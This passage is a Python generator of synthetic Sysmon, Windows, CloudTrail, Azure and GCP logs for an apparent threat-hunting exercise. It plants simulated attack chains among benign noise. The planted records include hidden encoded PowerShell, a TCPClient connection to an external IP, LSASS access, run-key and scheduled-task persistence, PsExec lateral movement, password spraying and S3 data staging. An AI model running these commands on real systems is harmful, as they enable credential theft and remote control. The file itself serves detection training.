import json
import random
import uuid
from datetime import datetime, timedelta


# ── Shared helpers ─────────────────────────────────────────────────────────

def _ts(base: datetime, offset_seconds: int = 0) -> str:
    return (base + timedelta(seconds=offset_seconds)).strftime('%Y-%m-%dT%H:%M:%S.000Z')


def _rand_ip(private=False):
    if private:
        return f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    return f"{random.randint(40,220)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"


def _rand_guid():
    return str(uuid.uuid4()).upper()


def _rand_hash():
    return ''.join(random.choices('0123456789ABCDEF', k=64))


HOSTNAMES = ['WKSTN-BAKER', 'WKSTN-CRANE', 'SRV-FINANCE01', 'SRV-DC01', 'WKSTN-ALLEN', 'WKSTN-MORRIS', 'SRV-APP01', 'SRV-FILE01']
USERNAMES = ['j.baker', 'a.crane', 'svc_backup', 'svc_deploy', 'm.allen', 'SYSTEM', 't.morris', 'r.james', 'svc_monitor', 'svc_print']
DOMAIN = 'CORP'

# Noise processes that look slightly suspicious but are benign
GREY_PROCESSES = [
    ('C:\\Windows\\System32\\wbem\\WmiPrvSE.exe', 'WmiPrvSE.exe'),
    ('C:\\Windows\\System32\\msiexec.exe', 'msiexec.exe /i update.msi /quiet'),
    ('C:\\Windows\\System32\\schtasks.exe', 'schtasks.exe /query /fo LIST'),
    ('C:\\Windows\\SysWOW64\\cmd.exe', 'cmd.exe /c ipconfig /all'),
    ('C:\\Windows\\System32\\net.exe', 'net user /domain'),
    ('C:\\Windows\\System32\\reg.exe', 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion'),
    ('C:\\Windows\\System32\\whoami.exe', 'whoami /priv'),
    ('C:\\Program Files\\7-Zip\\7z.exe', '7z.exe a backup.7z C:\\Users\\Public\\Documents'),
    ('C:\\Windows\\System32\\certutil.exe', 'certutil -decode encoded.txt decoded.exe'),
    ('C:\\Windows\\System32\\wscript.exe', 'wscript.exe //B //NoLogo script.vbs'),
]

BENIGN_PROCESSES = [
    ('C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'chrome.exe --type=renderer'),
    ('C:\\Windows\\System32\\svchost.exe', 'svchost.exe -k netsvcs -p'),
    ('C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', 'OUTLOOK.EXE'),
    ('C:\\Windows\\System32\\taskhostw.exe', 'taskhostw.exe'),
    ('C:\\Windows\\explorer.exe', 'C:\\Windows\\explorer.exe'),
    ('C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', 'WINWORD.EXE'),
    ('C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE', 'EXCEL.EXE /dde'),
    ('C:\\Windows\\System32\\SearchIndexer.exe', 'SearchIndexer.exe /Embedding'),
    ('C:\\Windows\\System32\\spoolsv.exe', 'C:\\Windows\\System32\\spoolsv.exe'),
    ('C:\\Program Files\\Windows Defender\\MsMpEng.exe', 'MsMpEng.exe'),
    ('C:\\Windows\\System32\\lsass.exe', 'C:\\Windows\\system32\\lsass.exe'),
    ('C:\\Windows\\System32\\services.exe', 'C:\\Windows\\system32\\services.exe'),
    ('C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe', 'msedge.exe --type=renderer'),
    ('C:\\Windows\\System32\\RuntimeBroker.exe', 'C:\\Windows\\System32\\RuntimeBroker.exe -Embedding'),
    ('C:\\Windows\\System32\\dllhost.exe', 'C:\\Windows\\system32\\dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'),
]


# ── Benign noise ──────────────────────────────────────────────────────────

def _benign_sysmon(base_time: datetime, apt_id: str, count: int = 80) -> list:
    events = []
    for i in range(count):
        proc = random.choice(BENIGN_PROCESSES)
        host = random.choice(HOSTNAMES)
        user = f'{DOMAIN}\\{random.choice(USERNAMES)}'
        offset = random.randint(0, 7200)
        events.append({
            'EventID': 1,
            'EventTime': _ts(base_time, offset),
            'Computer': host,
            'User': user,
            'Image': proc[0],
            'CommandLine': proc[1],
            'ParentImage': random.choice(['C:\\Windows\\explorer.exe', 'C:\\Windows\\System32\\services.exe', 'C:\\Windows\\System32\\svchost.exe']),
            'ProcessId': random.randint(1000, 9999),
            'ParentProcessId': random.randint(100, 999),
            'Hashes': f'SHA256={_rand_hash()}',
            'sourcetype': 'Sysmon',
            'index': f'ghosttrace_{apt_id}',
            'host': host
        })
    return events


def _grey_sysmon(base_time: datetime, apt_id: str, count: int = 25) -> list:
    """Semi-suspicious looking but legitimate processes to add noise and make hunting harder."""
    events = []
    for i in range(count):
        proc = random.choice(GREY_PROCESSES)
        host = random.choice(HOSTNAMES)
        user = f'{DOMAIN}\\{random.choice(USERNAMES)}'
        offset = random.randint(0, 7200)
        events.append({
            'EventID': 1,
            'EventTime': _ts(base_time, offset),
            'Computer': host,
            'User': user,
            'Image': proc[0],
            'CommandLine': proc[1],
            'ParentImage': random.choice(['C:\\Windows\\System32\\svchost.exe', 'C:\\Windows\\explorer.exe', 'C:\\Windows\\System32\\cmd.exe']),
            'ProcessId': random.randint(1000, 9999),
            'ParentProcessId': random.randint(100, 999),
            'Hashes': f'SHA256={_rand_hash()}',
            'sourcetype': 'Sysmon',
            'index': f'ghosttrace_{apt_id}',
            'host': host
        })
    return events


def _benign_4624(base_time: datetime, apt_id: str, count: int = 40) -> list:
    """Legitimate logon events to pad the authentication log."""
    events = []
    for i in range(count):
        host = random.choice(HOSTNAMES)
        user = random.choice(USERNAMES)
        events.append({
            'EventID': 4624,
            'EventTime': _ts(base_time, random.randint(0, 7200)),
            'Computer': host,
            'Channel': 'Security',
            'SubjectUserName': 'SYSTEM',
            'SubjectDomainName': DOMAIN,
            'TargetUserName': user,
            'TargetDomainName': DOMAIN,
            'LogonType': random.choice([2, 3, 10]),
            'IpAddress': _rand_ip(private=True),
            'LogonProcessName': random.choice(['NtLmSsp', 'Kerberos', 'User32']),
            'AuthenticationPackageName': random.choice(['NTLM', 'Kerberos', 'Negotiate']),
            'WorkstationName': random.choice(HOSTNAMES),
            'sourcetype': 'WinEventLog:Security',
            'index': f'ghosttrace_{apt_id}',
            'host': host
        })
    return events


def _benign_cloudtrail(base_time: datetime, apt_id: str, count: int = 30) -> list:
    """Legitimate AWS API calls to pad CloudTrail and hide malicious ones."""
    benign_calls = [
        ('ec2.amazonaws.com', 'DescribeInstances'),
        ('ec2.amazonaws.com', 'DescribeSecurityGroups'),
        ('s3.amazonaws.com', 'ListBuckets'),
        ('s3.amazonaws.com', 'GetBucketPolicy'),
        ('iam.amazonaws.com', 'GetUser'),
        ('iam.amazonaws.com', 'ListGroups'),
        ('cloudwatch.amazonaws.com', 'DescribeAlarms'),
        ('logs.amazonaws.com', 'DescribeLogGroups'),
        ('sts.amazonaws.com', 'GetCallerIdentity'),
        ('ec2.amazonaws.com', 'DescribeVpcs'),
        ('rds.amazonaws.com', 'DescribeDBInstances'),
        ('lambda.amazonaws.com', 'ListFunctions'),
    ]
    legit_users = ['svc-deploy', 'j.baker', 'a.crane', 't.morris', 'svc_monitor']
    events = []
    for i in range(count):
        call = random.choice(benign_calls)
        user = random.choice(legit_users)
        events.append({
            'eventVersion': '1.08',
            'userIdentity': {
                'type': 'IAMUser',
                'arn': f'arn:aws:iam::123456789012:user/{user}',
                'accessKeyId': f'AKIA{_rand_hash()[:16]}'
            },
            'eventTime': _ts(base_time, random.randint(0, 7200)),
            'eventSource': call[0],
            'eventName': call[1],
            'sourceIPAddress': _rand_ip(private=True),
            'userAgent': random.choice(['aws-cli/2.13.0 Python/3.11.0 Linux/5.15', 'console.amazonaws.com', 'Boto3/1.28.0 Python/3.11.0']),
            'requestParameters': {},
            'responseElements': None,
            'requestID': _rand_guid(),
            'eventID': _rand_guid(),
            'eventType': 'AwsApiCall',
            'awsRegion': random.choice(['eu-west-1', 'us-east-1', 'eu-west-2']),
            'sourcetype': 'aws:cloudtrail',
            'index': f'ghosttrace_{apt_id}',
            'host': 'cloudtrail'
        })
    return events


def _benign_azure_signin(base_time: datetime, apt_id: str, count: int = 35) -> list:
    """Legitimate Azure AD sign-ins to pad the identity logs."""
    users = ['j.baker@corp.onmicrosoft.com', 'a.crane@corp.onmicrosoft.com', 't.morris@corp.onmicrosoft.com',
             'r.james@corp.onmicrosoft.com', 'm.allen@corp.onmicrosoft.com', 'svc-monitor@corp.onmicrosoft.com']
    apps = ['Microsoft Teams', 'SharePoint Online', 'Exchange Online', 'Azure Portal', 'Microsoft 365']
    countries = ['GB', 'IE', 'DE', 'FR', 'NL']
    events = []
    for i in range(count):
        user = random.choice(users)
        events.append({
            'time': _ts(base_time, random.randint(0, 7200)),
            'category': 'SignInLogs',
            'operationName': 'Sign-in activity',
            'properties': {
                'userPrincipalName': user,
                'appDisplayName': random.choice(apps),
                'ipAddress': _rand_ip(private=False),
                'clientAppUsed': random.choice(['Browser', 'Mobile Apps and Desktop clients']),
                'status': {'errorCode': 0, 'failureReason': None},
                'authenticationDetails': [{'authenticationMethod': random.choice(['Password', 'Phone app notification', 'FIDO2 security key']), 'succeeded': True}],
                'location': {'city': random.choice(['London', 'Dublin', 'Berlin', 'Amsterdam']), 'countryOrRegion': random.choice(countries)},
                'conditionalAccessStatus': 'success'
            },
            'sourcetype': 'azure:aad:signin',
            'index': f'ghosttrace_{apt_id}',
            'host': 'azure'
        })
    return events


def _benign_gcp(base_time: datetime, apt_id: str, count: int = 25) -> list:
    """Legitimate GCP audit events."""
    legit_accounts = ['svc-deploy@corp-project.iam.gserviceaccount.com',
                      'j.baker@corp.onmicrosoft.com', 'ops-team@corp-project.iam.gserviceaccount.com']
    benign_methods = [
        ('compute.googleapis.com', 'v1.compute.instances.list'),
        ('storage.googleapis.com', 'storage.buckets.list'),
        ('storage.googleapis.com', 'storage.objects.list'),
        ('iam.googleapis.com', 'google.iam.admin.v1.GetServiceAccount'),
        ('cloudresourcemanager.googleapis.com', 'GetIamPolicy'),
        ('logging.googleapis.com', 'google.logging.v2.LoggingServiceV2.ListLogEntries'),
        ('monitoring.googleapis.com', 'google.monitoring.v3.MetricService.ListTimeSeries'),
    ]
    events = []
    for i in range(count):
        method = random.choice(benign_methods)
        account = random.choice(legit_accounts)
        events.append({
            'insertId': _rand_guid(),
            'timestamp': _ts(base_time, random.randint(0, 7200)),
            'logName': f'projects/corp-project/logs/cloudaudit.googleapis.com%2Factivity',
            'protoPayload': {
                '@type': 'type.googleapis.com/google.cloud.audit.AuditLog',
                'methodName': method[1],
                'serviceName': method[0],
                'authenticationInfo': {'principalEmail': account},
                'requestMetadata': {'callerIp': _rand_ip(private=True), 'callerSuppliedUserAgent': 'google-cloud-sdk'},
                'resourceName': f'projects/corp-project'
            },
            'sourcetype': 'gcp:audit',
            'index': f'ghosttrace_{apt_id}',
            'host': 'gcp'
        })
    return events


# ── CloudTrail malicious events ────────────────────────────────────────────

def _cloudtrail_attack(base_time: datetime, apt_id: str) -> list:
    """
    Full CloudTrail attack chain. Covers:
    apt29_exec_01 - AssumeRole (roleArn AdminRole, suspicious roleSessionName)
    apt29_exec_02 - S3 GetObject + CopyObject pivot from source IP
    Lazarus shares same chain with different base time.
    """
    aws_user = f'arn:aws:iam::123456789012:user/{random.choice(["svc-deploy", "j.baker", "a.crane"])}'
    source_ip = _rand_ip()
    session_token = _rand_guid()

    events = [
        # IAM recon - ListUsers
        {
            'eventVersion': '1.08',
            'userIdentity': {'type': 'IAMUser', 'arn': aws_user, 'accessKeyId': 'AKIAIOSFODNN7EXAMPLE', 'sessionToken': session_token},
            'eventTime': _ts(base_time, 0),
            'eventSource': 'iam.amazonaws.com',
            'eventName': 'ListUsers',
            'sourceIPAddress': source_ip,
            'userAgent': 'aws-cli/2.13.0 Python/3.11.0 Linux/5.15',
            'requestParameters': {},
            'responseElements': None,
            'requestID': _rand_guid(), 'eventID': _rand_guid(),
            'eventType': 'AwsApiCall', 'awsRegion': 'eu-west-1',
            'sourcetype': 'aws:cloudtrail', 'index': f'ghosttrace_{apt_id}', 'host': 'cloudtrail'
        },
        # IAM recon - ListRoles
        {
            'eventVersion': '1.08',
            'userIdentity': {'type': 'IAMUser', 'arn': aws_user, 'accessKeyId': 'AKIAIOSFODNN7EXAMPLE', 'sessionToken': session_token},
            'eventTime': _ts(base_time, 48),
            'eventSource': 'iam.amazonaws.com',
            'eventName': 'ListRoles',
            'sourceIPAddress': source_ip,
            'userAgent': 'aws-cli/2.13.0 Python/3.11.0 Linux/5.15',
            'requestParameters': {},
            'responseElements': None,
            'requestID': _rand_guid(), 'eventID': _rand_guid(),
            'eventType': 'AwsApiCall', 'awsRegion': 'eu-west-1',
            'sourcetype': 'aws:cloudtrail', 'index': f'ghosttrace_{apt_id}', 'host': 'cloudtrail'
        },
        # IAM recon - ListPolicies (extra noise before the key event)
        {
            'eventVersion': '1.08',
            'userIdentity': {'type': 'IAMUser', 'arn': aws_user, 'accessKeyId': 'AKIAIOSFODNN7EXAMPLE', 'sessionToken': session_token},
            'eventTime': _ts(base_time, 120),
            'eventSource': 'iam.amazonaws.com',
            'eventName': 'ListPolicies',
            'sourceIPAddress': source_ip,
            'userAgent': 'aws-cli/2.13.0 Python/3.11.0 Linux/5.15',
            'requestParameters': {'scope': 'Local'},
            'responseElements': None,
            'requestID': _rand_guid(), 'eventID': _rand_guid(),
            'eventType': 'AwsApiCall', 'awsRegion': 'eu-west-1',
            'sourcetype': 'aws:cloudtrail', 'index': f'ghosttrace_{apt_id}', 'host': 'cloudtrail'
        },
        # AssumeRole - T1550.001 (suspicious roleSessionName = 'recon-session')
        {
            'eventVersion': '1.08',
            'userIdentity': {'type': 'IAMUser', 'arn': aws_user, 'accessKeyId': 'AKIAIOSFODNN7EXAMPLE'},
            'eventTime': _ts(base_time, 315),
            'eventSource': 'sts.amazonaws.com',
            'eventName': 'AssumeRole',
            'sourceIPAddress': source_ip,
            'userAgent': 'aws-cli/2.13.0 Python/3.11.0 Linux/5.15',
            'requestParameters': {
                'roleArn': 'arn:aws:iam::123456789012:role/AdminRole',
                'roleSessionName': 'recon-session'
            },
            'responseElements': {
                'credentials': {
                    'accessKeyId': 'ASIAIOSFODNN7EXAMPLE',
                    'expiration': _ts(base_time, 4315)
                }
            },
            'requestID': _rand_guid(), 'eventID': _rand_guid(),
            'eventType': 'AwsApiCall', 'awsRegion': 'eu-west-1',
            'sourcetype': 'aws:cloudtrail', 'index': f'ghosttrace_{apt_id}', 'host': 'cloudtrail'
        },
        # EC2 recon post role assumption from same IP (decoy - not what they're after)
        {
            'eventVersion': '1.08',
            'userIdentity': {'type': 'AssumedRole', 'arn': 'arn:aws:sts::123456789012:assumed-role/AdminRole/recon-session'},
            'eventTime': _ts(base_time, 420),
            'eventSource': 'ec2.amazonaws.com',
            'eventName': 'DescribeInstances',
            'sourceIPAddress': source_ip,
            'userAgent': 'aws-cli/2.13.0',
            'requestParameters': {},
            'responseElements': None,
            'requestID': _rand_guid(), 'eventID': _rand_guid(),
            'eventType': 'AwsApiCall', 'awsRegion': 'eu-west-1',
            'sourcetype': 'aws:cloudtrail', 'index': f'ghosttrace_{apt_id}', 'host': 'cloudtrail'
        },
        # S3 GetObject - T1530 (financial data)
        {
            'eventVersion': '1.08',
            'userIdentity': {'type': 'AssumedRole', 'arn': 'arn:aws:sts::123456789012:assumed-role/AdminRole/recon-session'},
            'eventTime': _ts(base_time, 890),
            'eventSource': 's3.amazonaws.com',
            'eventName': 'GetObject',
            'sourceIPAddress': source_ip,
            'userAgent': 'aws-cli/2.13.0',
            'requestParameters': {'bucketName': 'corp-finance-reports', 'key': 'Q4-2024/financial-summary.xlsx'},
            'responseElements': None,
            'requestID': _rand_guid(), 'eventID': _rand_guid(),
            'eventType': 'AwsApiCall', 'awsRegion': 'eu-west-1',
            'sourcetype': 'aws:cloudtrail', 'index': f'ghosttrace_{apt_id}', 'host': 'cloudtrail'
        },
        # S3 GetObject second file
        {
            'eventVersion': '1.08',
            'userIdentity': {'type': 'AssumedRole', 'arn': 'arn:aws:sts::123456789012:assumed-role/AdminRole/recon-session'},
            'eventTime': _ts(base_time, 920),
            'eventSource': 's3.amazonaws.com',
            'eventName': 'GetObject',
            'sourceIPAddress': source_ip,
            'userAgent': 'aws-cli/2.13.0',
            'requestParameters': {'bucketName': 'corp-finance-reports', 'key': 'Q4-2024/budget-forecast.xlsx'},
            'responseElements': None,
            'requestID': _rand_guid(), 'eventID': _rand_guid(),
            'eventType': 'AwsApiCall', 'awsRegion': 'eu-west-1',
            'sourcetype': 'aws:cloudtrail', 'index': f'ghosttrace_{apt_id}', 'host': 'cloudtrail'
        },
        # S3 CopyObject - T1537 staging exfil bucket
        {
            'eventVersion': '1.08',
            'userIdentity': {'type': 'AssumedRole', 'arn': 'arn:aws:sts::123456789012:assumed-role/AdminRole/recon-session'},
            'eventTime': _ts(base_time, 1245),
            'eventSource': 's3.amazonaws.com',
            'eventName': 'CopyObject',
            'sourceIPAddress': source_ip,
            'userAgent': 'aws-cli/2.13.0',
            'requestParameters': {
                'bucketName': 'corp-staging-temp',
                'key': 'backup/fin-data.zip',
                'x-amz-copy-source': 'corp-finance-reports/Q4-2024/financial-summary.xlsx'
            },
            'responseElements': None,
            'requestID': _rand_guid(), 'eventID': _rand_guid(),
            'eventType': 'AwsApiCall', 'awsRegion': 'eu-west-1',
            'sourcetype': 'aws:cloudtrail', 'index': f'ghosttrace_{apt_id}', 'host': 'cloudtrail'
        },
    ]
    return events


# ── Sysmon malicious events ────────────────────────────────────────────────

def _sysmon_attack(base_time: datetime, apt_id: str) -> list:
    """
    Full Sysmon attack chain covering:
    - EID1 encoded PowerShell (apt29_exec_03 / apt28_exec_01)
    - EID11 file drop to Temp (apt28_exec_02)
    - EID3 C2 beaconing x3 (apt29_exec_04 / apt28_exec_03)
    - EID10 LSASS access (apt29_exec_05 / apt28_exec_04)
    - EID13 registry run key (apt29_exec_06 / apt28_exec_06)
    - EID1 lateral movement psexec (apt28_exec_07)
    - EID3 additional decoy connections to mislead
    """
    host = random.choice(HOSTNAMES[:4])
    user = f'{DOMAIN}\\{random.choice(USERNAMES[:4])}'
    c2_ip = _rand_ip()
    decoy_ip = _rand_ip()
    lsass_pid = random.randint(600, 800)
    malware_pid = random.randint(4000, 8000)
    ps_pid = random.randint(2000, 3999)
    chrome_pid = random.randint(8000, 12000)

    events = [
        # EID11 - File drop FIRST (before PowerShell spawns it)
        {
            'EventID': 11,
            'EventTime': _ts(base_time, 90),
            'Computer': host, 'User': user,
            'Image': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            'ProcessId': ps_pid,
            'TargetFilename': 'C:\\Windows\\Temp\\svchost32.exe',
            'CreationUtcTime': _ts(base_time, 90),
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID1 - Encoded PowerShell (T1059.001 + T1027)
        {
            'EventID': 1,
            'EventTime': _ts(base_time, 122),
            'Computer': host, 'User': user,
            'Image': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            'CommandLine': 'powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0AA==',
            'ParentImage': 'C:\\Windows\\System32\\cmd.exe',
            'ParentCommandLine': 'cmd.exe /c start /b powershell',
            'ProcessId': ps_pid,
            'ParentProcessId': random.randint(1000, 2000),
            'Hashes': f'SHA256={_rand_hash()}',
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID3 - Decoy connection from Chrome (makes hunting harder)
        {
            'EventID': 3,
            'EventTime': _ts(base_time, 145),
            'Computer': host, 'User': user,
            'Image': 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            'ProcessId': chrome_pid,
            'DestinationIp': decoy_ip,
            'DestinationPort': 443,
            'SourceIp': _rand_ip(private=True),
            'SourcePort': random.randint(49152, 65535),
            'Protocol': 'tcp',
            'Initiated': True,
            'DestinationHostname': f'www.googleapis.com',
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID3 - First C2 beacon from PowerShell (T1071.001)
        {
            'EventID': 3,
            'EventTime': _ts(base_time, 188),
            'Computer': host, 'User': user,
            'Image': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            'ProcessId': ps_pid,
            'DestinationIp': c2_ip,
            'DestinationPort': 443,
            'SourceIp': _rand_ip(private=True),
            'SourcePort': random.randint(49152, 65535),
            'Protocol': 'tcp',
            'Initiated': True,
            'DestinationHostname': f'cdn-{random.randint(100,999)}.updates-service.net',
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID3 - Second C2 beacon (same IP - beaconing pattern)
        {
            'EventID': 3,
            'EventTime': _ts(base_time, 488),
            'Computer': host, 'User': user,
            'Image': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            'ProcessId': ps_pid,
            'DestinationIp': c2_ip,
            'DestinationPort': 443,
            'SourceIp': _rand_ip(private=True),
            'SourcePort': random.randint(49152, 65535),
            'Protocol': 'tcp',
            'Initiated': True,
            'DestinationHostname': f'cdn-{random.randint(100,999)}.updates-service.net',
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID3 - Third C2 beacon (confirms pattern)
        {
            'EventID': 3,
            'EventTime': _ts(base_time, 790),
            'Computer': host, 'User': user,
            'Image': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            'ProcessId': ps_pid,
            'DestinationIp': c2_ip,
            'DestinationPort': 443,
            'SourceIp': _rand_ip(private=True),
            'SourcePort': random.randint(49152, 65535),
            'Protocol': 'tcp',
            'Initiated': True,
            'DestinationHostname': f'cdn-{random.randint(100,999)}.updates-service.net',
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID1 - svchost32.exe spawns (malware runs from dropped binary)
        {
            'EventID': 1,
            'EventTime': _ts(base_time, 320),
            'Computer': host, 'User': user,
            'Image': 'C:\\Windows\\Temp\\svchost32.exe',
            'CommandLine': 'C:\\Windows\\Temp\\svchost32.exe -silent',
            'ParentImage': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            'ParentCommandLine': 'powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0AA==',
            'ProcessId': malware_pid,
            'ParentProcessId': ps_pid,
            'Hashes': f'SHA256={_rand_hash()}',
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID10 - LSASS access (T1003.001)
        {
            'EventID': 10,
            'EventTime': _ts(base_time, 342),
            'Computer': host, 'User': user,
            'SourceImage': 'C:\\Windows\\Temp\\svchost32.exe',
            'SourceProcessId': malware_pid,
            'TargetImage': 'C:\\Windows\\System32\\lsass.exe',
            'TargetProcessId': lsass_pid,
            'GrantedAccess': '0x1010',
            'CallTrace': 'C:\\Windows\\SYSTEM32\\ntdll.dll+9d404|C:\\Windows\\System32\\KERNELBASE.dll+70bf6',
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID13 - Registry run key persistence (T1547.001)
        {
            'EventID': 13,
            'EventTime': _ts(base_time, 412),
            'Computer': host, 'User': user,
            'EventType': 'SetValue',
            'TargetObject': 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateHelper',
            'Details': 'C:\\Windows\\Temp\\svchost32.exe -silent',
            'Image': 'C:\\Windows\\Temp\\svchost32.exe',
            'ProcessId': malware_pid,
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID1 - Lateral movement via PsExec (T1021.002)
        {
            'EventID': 1,
            'EventTime': _ts(base_time, 722),
            'Computer': host, 'User': user,
            'Image': 'C:\\Windows\\System32\\cmd.exe',
            'CommandLine': f'cmd.exe /c psexec.exe \\\\SRV-DC01 -u {DOMAIN}\\svc_backup -p [REDACTED] cmd.exe',
            'ParentImage': 'C:\\Windows\\Temp\\svchost32.exe',
            'ParentCommandLine': 'C:\\Windows\\Temp\\svchost32.exe -silent',
            'ProcessId': random.randint(5000, 9000),
            'ParentProcessId': malware_pid,
            'Hashes': f'SHA256={_rand_hash()}',
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
    ]
    return events


# ── Windows Event Log malicious events ────────────────────────────────────

def _winevent_attack(base_time: datetime, apt_id: str) -> list:
    """
    Covers:
    - EID4625 failed logons / credential spray (apt28_exec_05)
    - EID4624 successful logon after spray
    - EID4776 NTLM auth
    - EID4648 explicit creds / pass-the-hash indicator
    - EID4698 scheduled task creation (apt29_exec_06 / apt28_exec_06)
    - EID4103 PowerShell module logging
    """
    host = random.choice(HOSTNAMES[:3])
    dc = 'SRV-DC01'
    src_ip = _rand_ip(private=True)
    attacker_ip = _rand_ip()

    # Spray fails from attacker IP (buried among legitimate failures)
    spray_targets = ['administrator', 'svc_backup', 'svc_deploy', 'j.baker', 'a.crane']
    events = []

    # Decoy failed logon from internal IP (looks suspicious but is noise)
    for _ in range(3):
        events.append({
            'EventID': 4625,
            'EventTime': _ts(base_time, random.randint(0, 25)),
            'Computer': dc,
            'Channel': 'Security',
            'TargetUserName': random.choice(USERNAMES),
            'TargetDomainName': DOMAIN,
            'LogonType': 3,
            'IpAddress': _rand_ip(private=True),
            'FailureReason': 'Unknown user name or bad password',
            'SubStatus': '0xC000006A',
            'sourcetype': 'WinEventLog:Security', 'index': f'ghosttrace_{apt_id}', 'host': dc
        })

    # Actual spray failures from attacker IP
    for i, target in enumerate(spray_targets):
        events.append({
            'EventID': 4625,
            'EventTime': _ts(base_time, 30 + (i * 8)),
            'Computer': dc,
            'Channel': 'Security',
            'TargetUserName': target,
            'TargetDomainName': DOMAIN,
            'LogonType': 3,
            'IpAddress': attacker_ip,
            'FailureReason': 'Unknown user name or bad password',
            'SubStatus': '0xC000006A',
            'sourcetype': 'WinEventLog:Security', 'index': f'ghosttrace_{apt_id}', 'host': dc
        })

    events += [
        # EID4776 - NTLM auth attempt (same attacker IP)
        {
            'EventID': 4776,
            'EventTime': _ts(base_time, 58),
            'Computer': dc, 'Channel': 'Security',
            'TargetUserName': 'svc_backup',
            'Workstation': HOSTNAMES[0],
            'ErrorCode': '0x0',
            'sourcetype': 'WinEventLog:Security', 'index': f'ghosttrace_{apt_id}', 'host': dc
        },
        # EID4624 - Successful logon after spray (same attacker IP)
        {
            'EventID': 4624,
            'EventTime': _ts(base_time, 62),
            'Computer': host, 'Channel': 'Security',
            'SubjectUserName': 'SYSTEM', 'SubjectDomainName': DOMAIN,
            'TargetUserName': 'svc_backup', 'TargetDomainName': DOMAIN,
            'LogonType': 3,
            'IpAddress': attacker_ip,
            'LogonProcessName': 'NtLmSsp',
            'AuthenticationPackageName': 'NTLM',
            'WorkstationName': HOSTNAMES[0],
            'sourcetype': 'WinEventLog:Security', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID4648 - Explicit credentials / pass-the-hash indicator
        {
            'EventID': 4648,
            'EventTime': _ts(base_time, 718),
            'Computer': host, 'Channel': 'Security',
            'SubjectUserName': USERNAMES[0], 'SubjectDomainName': DOMAIN,
            'AccountName': 'svc_backup', 'AccountDomain': DOMAIN,
            'TargetServerName': 'SRV-DC01',
            'ProcessName': 'C:\\Windows\\Temp\\svchost32.exe',
            'IpAddress': src_ip,
            'sourcetype': 'WinEventLog:Security', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID4698 - Scheduled task created (T1053.005)
        {
            'EventID': 4698,
            'EventTime': _ts(base_time, 824),
            'Computer': host, 'Channel': 'Security',
            'SubjectUserName': 'svc_backup', 'SubjectDomainName': DOMAIN,
            'TaskName': '\\Microsoft\\Windows\\WindowsUpdate\\UpdateHelper',
            'TaskContent': '<Task><Actions><Exec><Command>C:\\Windows\\Temp\\svchost32.exe</Command></Exec></Actions></Task>',
            'sourcetype': 'WinEventLog:Security', 'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID4103 - PowerShell module logging
        {
            'EventID': 4103,
            'EventTime': _ts(base_time, 128),
            'Computer': host, 'Channel': 'Microsoft-Windows-PowerShell/Operational',
            'ContextInfo': f'Runspace ID={_rand_guid()}',
            'Payload': 'CommandInvocation(Invoke-Expression): "Invoke-Expression"\nParameterBinding(Invoke-Expression): name="Command"; value="[System.Reflection.Assembly]::LoadWithPartialName(\'Microsoft.CSharp\')"',
            'UserName': f'{DOMAIN}\\svc_backup',
            'sourcetype': 'WinEventLog:Microsoft-Windows-PowerShell/Operational',
            'index': f'ghosttrace_{apt_id}', 'host': host
        },
        # EID4104 - PowerShell ScriptBlock logging (decoded content hint)
        {
            'EventID': 4104,
            'EventTime': _ts(base_time, 130),
            'Computer': host, 'Channel': 'Microsoft-Windows-PowerShell/Operational',
            'ScriptBlockText': '$s=New-Object Net.Sockets.TCPClient;$s.Connect("' + _rand_ip() + '",443);$stream=$s.GetStream();',
            'ScriptBlockId': _rand_guid(),
            'Path': '',
            'UserName': f'{DOMAIN}\\svc_backup',
            'sourcetype': 'WinEventLog:Microsoft-Windows-PowerShell/Operational',
            'index': f'ghosttrace_{apt_id}', 'host': host
        },
    ]
    return events


# ── Azure AAD attack events ────────────────────────────────────────────────

def _azure_aad_attack(base_time: datetime, apt_id: str) -> list:
    """
